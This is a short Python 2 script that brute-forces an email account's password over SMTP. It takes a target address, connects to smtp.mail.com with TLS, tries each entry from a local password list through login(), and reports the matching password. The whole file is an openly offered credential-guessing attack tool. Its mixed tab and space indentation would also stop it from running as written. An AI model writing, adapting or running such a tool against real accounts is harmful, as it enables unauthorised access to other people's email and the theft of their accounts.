import smtplib
import signal

def smtp_mail_brute():
	
	email=raw_input(">>>smtp>>>Enter email address:")
	print("[*]Connecting to mail.com Server")
	smtp_gmail=smtplib.SMTP("smtp.mail.com",587)
	print("[*]Successfully connected to mail.com")
        smtp_gmail.ehlo()
	print("[*]Creating a secure TLS channel")
        smtp_gmail.starttls()
	print("[*]Succesfully created a TLS channel")
	print("[*]Reading Passwords List")
	passfile=open("./password_lists/passwords.txt","r")
	print("[*]Successfully read passwords list")

	for password in passfile.readlines():

		password=password.rstrip('\n')

		try:
			smtp_gmail.login(email,password)
			smtp_gmail=smtplib.SMTP("smtp.mail.com",587)
                        smtp_gmail.ehlo()
                        smtp_gmail.starttls()
	
		except smtplib.SMTPAuthenticationError:
			print('\x1b[0;30;41m'+"[!]Incorrect password:%s" %password+'\x1b[0m')

		except KeyboardInterrupt:
			print("\nQuitting..")
			return

		else:
			print('\x1b[0;30;42m' + "[+]Correct password: %s" %password+'\x1b[0m')
			break

